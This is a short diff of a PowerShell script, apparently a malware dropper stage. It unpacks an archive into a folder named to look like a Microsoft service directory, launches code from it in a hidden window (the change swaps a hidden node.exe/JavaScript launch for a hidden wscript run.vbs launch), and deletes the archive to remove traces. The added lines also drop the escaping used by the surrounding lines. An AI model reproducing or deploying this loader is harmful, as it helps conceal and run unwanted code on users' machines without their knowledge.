@@ -17,14 +17,13 @@ Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
 
 `$folderDir = `"$env:APPDATA\Microsoft\Service\App`"
 
-`$nodePath = Join-Path `$folderDir "node.exe"
-`$js = Get-ChildItem -Path `$folderDir -Filter "index_*.js" | Select-Object -First 1
+$runVbs = Join-Path $folderDir "run.vbs"
 
-if (`$js) {
-	Start-Process `$nodePath `` 
-		-ArgumentList `"```"`$(`$js.FullName)```"`" `` 
-		-WindowStyle Hidden `` 
-		-WorkingDirectory `$folderDir
+if (Test-Path $runVbs) {
+    Start-Process "wscript.exe" `
+        -ArgumentList "`"$runVbs`"" `
+        -WindowStyle Hidden `
+        -WorkingDirectory $folderDir
 }
 
 Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
